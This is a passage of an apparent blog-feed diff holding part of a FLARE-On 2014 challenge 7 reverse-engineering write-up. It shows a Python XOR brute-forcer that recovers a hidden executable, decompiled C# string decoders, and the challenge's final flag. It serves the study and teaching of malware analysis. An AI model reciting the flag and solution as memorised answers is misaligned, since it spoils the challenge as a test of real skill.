+</span><span class="line">                          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key12</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]])</span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]])</span>
+</span><span class="line">
+</span><span class="line">                            <span class="k">if</span> <span class="p">(</span> <span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;M&#39;</span> <span class="ow">and</span> <span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;Z&#39;</span><span class="p">):</span>
+</span><span class="line">                              <span class="k">print</span> <span class="s">&quot;Found it&quot;</span>
+</span><span class="line">                              <span class="k">print</span> <span class="n">out</span>
+</span><span class="line">                              <span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</span><span class="line">
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span>
+</span><span class="line">
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">ind1</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">ind2</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">ind3</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">ind4</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">ind5</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">ind6</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">ind7</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">ind8</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">ind9</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">ind10</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">ind11</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">ind13</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">ind14</span><span class="p">])</span>
+</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="s">&#39;backdoge.exe&#39;</span><span class="p">)</span>
+</span><span class="line">
+</span><span class="line">                              <span class="n">decodedfilename</span> <span class="o">=</span> <span class="s">&quot;c:</span><span class="se">\\</span><span class="s">gratz&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">counter</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;.exe&quot;</span>
+</span><span class="line">                              <span class="n">decodedfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="n">decodedfilename</span><span class="p">,</span><span class="s">&#39;wb&#39;</span><span class="p">)</span>
+</span><span class="line">                              <span class="n">decodedfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</span><span class="line">                              <span class="n">decodedfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class="line">
+</span><span class="line">                            <span class="c"># be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  </span>
+</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span>
+</span><span class="line">                            <span class="n">counter</span> <span class="o">+=</span><span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>It’s a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first <code>0x80</code> bytes of the binary which is the <code>DOS Stub</code>. In the end, it compares the first two bytes with <code>MZ</code> and then xor-es the whole binary before writing it to a file.</p>
+
+<p>I got two files and after opening them in hex editors, one was clearly a false positive. I ran the correct binary.</p>
+
+<p><img src="http://parsiya.net/images/2014/flare/7-23.jpg" alt="Almost done" title="Almost done" /></p>
+
+<p>But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Decompiled gratz.exe </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+</pre></td><td class="code"><pre><code class="c#"><span class="line"><span class="k">public</span> <span class="nf">Form1</span><span class="p">()</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">InitializeComponent</span><span class="p">();</span>
+</span><span class="line">  <span class="k">new</span> <span class="nf">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">lulzors</span><span class="p">)).</span><span class="n">Start</span><span class="p">();</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">public</span> <span class="k">void</span> <span class="nf">lulzors</span><span class="p">()</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">  <span class="n">lulz</span> <span class="n">lulz</span> <span class="p">=</span> <span class="k">new</span> <span class="n">lulz</span><span class="p">();</span>
+</span><span class="line">  <span class="n">Thread</span> <span class="n">thread</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="n">lulz</span><span class="p">.</span><span class="n">datwork</span><span class="p">));</span>
+</span><span class="line">  <span class="n">thread</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+</span><span class="line">  <span class="k">do</span>
+</span><span class="line">    <span class="p">;</span>
+</span><span class="line">  <span class="k">while</span> <span class="p">(</span><span class="n">thread</span><span class="p">.</span><span class="n">IsAlive</span><span class="p">);</span>
+</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">label2</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">lulz</span><span class="p">.</span><span class="n">decoder4</span><span class="p">(</span><span class="s">&quot;\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>And inside <code>lulz.cs</code>.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>lulz.cs </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+</pre></td><td class="code"><pre><code class="c#"><span class="line"><span class="c1">// decoder1 and decoder3 omitted</span>
+</span><span class="line">
+</span><span class="line"><span class="k">public</span> <span class="kt">string</span> <span class="nf">decoder2</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
+</span><span class="line">  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="s">&quot;this&quot;</span><span class="p">;</span>
+</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
+</span><span class="line">    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
+</span><span class="line">  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">public</span> <span class="kt">string</span> <span class="nf">decoder4</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
+</span><span class="line">  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">decoder2</span><span class="p">(</span><span class="s">&quot;\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K&quot;</span><span class="p">);</span>
+</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
+</span><span class="line">    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
+</span><span class="line">  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>We can either write code or paste it into an online C# compiler. In the end we have the flag:</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 7 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">da7.f1are.finish.lin3@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>And the email:</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">Alright, we give in. You've done it. Your reversing-fu is strong.
+</span><span class="line">I'll pass your info on to the FLARE team and someone will be in touch.
+</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>
 ]]></content>
   </entry>
   
